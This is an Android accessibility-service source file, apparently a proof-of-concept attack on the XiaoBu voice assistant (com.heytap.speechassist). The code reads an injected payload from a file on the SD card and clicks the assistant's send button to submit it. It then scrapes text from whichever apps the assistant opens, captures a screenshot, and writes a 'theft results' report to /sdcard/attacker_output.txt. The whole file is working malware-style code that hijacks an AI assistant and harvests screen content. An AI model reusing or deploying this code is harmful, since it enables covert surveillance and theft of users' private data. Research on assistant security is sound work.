package com.attacker.xiaobu;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Executors;

public class AttackAccessibilityService extends AccessibilityService {
    private static final String TAG = "XiaoBuAttack";
    private static final String XB = "com.heytap.speechassist";
    private final Handler h = new Handler(Looper.getMainLooper());
    private String lastP = "";
    private int stage = 0, cnt = 0;
    private long t0 = 0;
    private boolean shot = false;
    private final Map<String, List<String>> data = new LinkedHashMap<>();
    private final List<String> pics = new ArrayList<>();

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 200;
        setServiceInfo(info);
        Log.i(TAG, "🔧 ready");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";

            // 跟踪模式
            if (stage >= 3) {
                collect(pkg);
                if (System.currentTimeMillis() - t0 > 25000) finish();
                // 跟踪期间也检查新攻击
                if (XB.equals(pkg)) checkFlag();
                return;
            }

            if (!XB.equals(pkg)) return;
            checkFlag();
        } catch (Exception e) {}
    }

    private void checkFlag() {
        try {
            java.io.File f = new java.io.File("/sdcard/attack_payload.txt");
            if (!f.exists()) return;
            java.io.FileInputStream fis = new java.io.FileInputStream(f);
            byte[] d = new byte[fis.available()]; fis.read(d); fis.close();
            String p = new String(d, "UTF-8").trim();
            if (p.isEmpty() || p.equals(lastP)) return;
            lastP = p; f.delete();
            Log.i(TAG, "🔍 " + p);

            // 重置并开始
            stage = 1; data.clear(); pics.clear(); shot = false; t0 = System.currentTimeMillis();
            h.removeCallbacksAndMessages(null);
            h.postDelayed(() -> clickSend(0), 2000);
        } catch (Exception e) {}
    }

    private void clickSend(int retry) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            List<AccessibilityNodeInfo> btns = root.findAccessibilityNodeInfosByViewId(XB + ":id/btn_send");
            if (btns != null && !btns.isEmpty()) {
                btns.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
                Log.i(TAG, "✅ click");
                root.recycle();
                h.postDelayed(() -> { stage = 3; cnt = 0; collect(XB); track(); }, 1500);
                return;
            }
            root.recycle();
        }
        if (retry < 4) {
            h.postDelayed(() -> clickSend(retry + 1), 800);
        } else {
            Log.w(TAG, "btn not found, track anyway");
            h.postDelayed(() -> { stage = 3; cnt = 0; collect(XB); track(); }, 500);
        }
    }

    private void track() {
        cnt++;
        h.postDelayed(() -> {
            if (stage >= 4) return;
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                collect(root.getPackageName() != null ? root.getPackageName().toString() : "?");
                root.recycle();
            }
            if (System.currentTimeMillis() - t0 > 25000 || cnt > 10) finish();
            else track();
        }, 2500);
    }

    private void collect(String pkg) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        List<String> texts = new ArrayList<>();
        extract(root, texts);
        if (!texts.isEmpty()) {
            List<String> f = new ArrayList<>();
            for (String t : texts) if (t.length() >= 2 && !t.matches("[0-9.]{1,3}")) f.add(t);
            if (data.containsKey(pkg)) {
                for (String t : f) if (!data.get(pkg).contains(t)) data.get(pkg).add(t);
            } else {
                data.put(pkg, new ArrayList<>(f));
                if (!shot && !XB.equals(pkg)) { screen(); shot = true; }
            }
        }
        root.recycle();
    }

    private void screen() {
        try {
            String path = "/sdcard/attacker_screen_" + System.currentTimeMillis() + ".png";
            takeScreenshot(android.view.Display.DEFAULT_DISPLAY, Executors.newSingleThreadExecutor(),
                new TakeScreenshotCallback() {
                    public void onSuccess(ScreenshotResult r) {
                        try {
                            Bitmap b = Bitmap.wrapHardwareBuffer(r.getHardwareBuffer(), r.getColorSpace());
                            if (b != null) {
                                FileOutputStream o = new FileOutputStream(path);
                                b.compress(Bitmap.CompressFormat.PNG, 100, o); o.close();
                                b.recycle(); r.getHardwareBuffer().close();
                                pics.add(path);
                                Log.i(TAG, "📸 " + new java.io.File(path).length() + "B");
                            }
                        } catch (Exception e) {}
                    }
                    public void onFailure(int c) {}
                });
        } catch (Exception e) {}
    }

    private void finish() {
        if (stage >= 4) return; stage = 4;
        StringBuilder sb = new StringBuilder();
        sb.append("=== 窃取结果 ===\n载荷: ").append(lastP).append("\n\n");
        for (Map.Entry<String, List<String>> e : data.entrySet()) {
            sb.append("─── ").append(e.getKey()).append(" (").append(e.getValue().size()).append("条) ───\n");
            for (int i = 0; i < e.getValue().size(); i++) {
                String t = e.getValue().get(i);
                if (t.length() > 300) t = t.substring(0, 300) + "...";
                sb.append("  [").append(i).append("] ").append(t).append("\n");
            }
            sb.append("\n");
        }
        if (!pics.isEmpty()) { sb.append("📸:\n"); for (String s : pics) sb.append("  ").append(s).append("\n"); }
        sb.append("✓\n");
        try { FileOutputStream o = new FileOutputStream("/sdcard/attacker_output.txt"); o.write(sb.toString().getBytes("UTF-8")); o.close(); } catch (Exception e) {}
        Log.i(TAG, "🎉 done " + data.size() + " apps");
        stage = 0; lastP = ""; data.clear(); pics.clear();
    }

    private void extract(AccessibilityNodeInfo n, List<String> o) {
        if (n == null || o.size() > 80) return;
        try {
            CharSequence t = n.getText(); if (t != null && t.length() > 0 && t.length() < 300) o.add(t.toString().trim());
            CharSequence d = n.getContentDescription(); if (d != null && d.length() > 0 && d.length() < 100) o.add("[desc] " + d.toString().trim());
            for (int i = 0; i < n.getChildCount(); i++) { AccessibilityNodeInfo c = n.getChild(i); if (c != null) { extract(c, o); c.recycle(); } }
        } catch (Exception e) {}
    }

    @Override public void onInterrupt() {}
}
